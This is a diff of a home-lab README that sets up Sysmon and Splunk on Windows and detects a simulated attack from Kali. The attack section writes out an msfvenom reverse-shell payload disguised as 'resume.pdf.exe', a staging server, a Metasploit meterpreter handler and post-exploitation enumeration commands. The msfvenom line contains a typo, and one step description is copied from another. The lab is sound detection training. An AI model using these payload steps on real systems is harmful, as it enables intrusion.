@@ -15,7 +15,7 @@ To establish a comprehensive defensive posture on the Windows, a centralized log
 ### 1. Sysmon :
 A local Windows background driver. That watches system behavior to capture critical host level telemetry and writes that information into the Windows Event Viewer.
 
-* **● Installation Steps ~**
+* **Installation Steps ~**
 (These steps are for Arm64 who are running Virtual machine on Macbook. For Windows just Download sysmon64.exe and remaning steps are same)
 1) Step 1 : Download & Prepare Files
 • Download the Sysinternals Suite and extract the files.
@@ -35,7 +35,7 @@ cd C \Sysmon
 ### 2. Splunk Enterprise
 The heavy duty SIEM software engine. Which ingests raw log files, breaks them down into searchable fields, lets you run complex queries, and builds dashboards.
 
-* **● Installation Steps ~** 
+* **Installation Steps ~** 
 1) Step 1 : Download
 • Create free account on Splunk official website.
 • Navigate to the Splunk Enterprise & download as per ur system need.
@@ -47,7 +47,7 @@ The heavy duty SIEM software engine. Which ingests raw log files, breaks them do
 • Splunk Add-on for Sysmon
 
 ### 3. Ingest Sysmon logs into Splunk
-* **● Configuration Steps ~**
+* **Configuration Steps ~**
 
 1) Step 1 : Create a index in Splunk
 • Log in to your Splunk Web interface
@@ -78,34 +78,34 @@ This phase outlines the simulated attack methodology executed from the Kali Linu
 ### 1. Passive & Active Reconnaissance
 * **Nmap Scanning :** Executed an aggressive service and script scan against the target asset to identify active entry pathways ~
 ```bash
-  nmap -p 3389 192.168.64.13
+nmap -p 3389 192.168.64.13
 ```
 ### 2. Weaponization & Payload Delivery
 * **Msfvenom Payload Generation :** Executed an aggressive service and script scan against the target asset to identify active entry pathways ~
 ```bash
-  msfvenom -p windows/shell/reverse_tcp LHOST=192.168.64.6 LPORT-4444 -f exe -o resume.pdf.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.64.6 LPORT-4444 -f exe -o resume.pdf.exe
 ```
 * **Staging Server Deployment :** Launched a lightweight Python HTTP application server to stage the malicious artifact for retrieval ~
 ```bash
-    python3 -m http.server 9999
+python3 -m http.server 9999
 ```
 ### 3. Command & Control (C2) Exploitation
 * **Metasploit Multi Handler Console :** Activated the backend socket handler on the Kali infrastructure to listen for inbound beacon calls from the target endpoint ~
 ```bash
-     msfconsole 
+msfconsole 
 ```
 ```bash
-    use exploit/multi/handler
-    set payload windows/meterpreter/reverse_tcp
-    set LHOST 192.168.64.6
-    set LPORT 4444
-    exploit
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.64.6
+set LPORT 4444
+exploit
 ```
 * **Post-Exploitation Enumeration Commands :** Upon payload execution, an interactive interactive command terminal shell (cmd) was successfully obtained. The following tactical host-reconnaissance commands were performed through the stream ~
 ```bash
-     whoami      # Verified current user context ("Jay")
-    net user    # Enumerated all configured local accounts on the system
-    ipconfig    # Profiled network interface details and verified IP tracking
+whoami      # Verified current user context ("Jay")
+net user    # Enumerated all configured local accounts on the system
+ipconfig    # Profiled network interface details and verified IP tracking
 ```
 ---
 
@@ -115,10 +115,10 @@ This final phase showcases the log verification and analytical troubleshooting m
 
 ### 1. Query Optimization
 ```splunk
-     index=endpoint "resume.pdf.exe"
+index=endpoint "resume.pdf.exe"
 ```
 ```splunk
-     index=endpoint "resume.pdf.exe" | rex field=_raw "Image'>(?<Image>[^<]+)" | rex field=_raw "CommandLine'>(<CommandLine>[^<]+)" | table _time, EventID, Image, CommandLine
+index=endpoint "resume.pdf.exe" | rex field=_raw "Image'>(?<Image>[^<]+)" | rex field=_raw "CommandLine'>(<CommandLine>[^<]+)" | table _time, EventID, Image, CommandLine
 ```
 ### 2. Forensic Timeline Event Breakdown
 The execution of the custom query uncovered an absolute match with the simulated timeline of the compromise
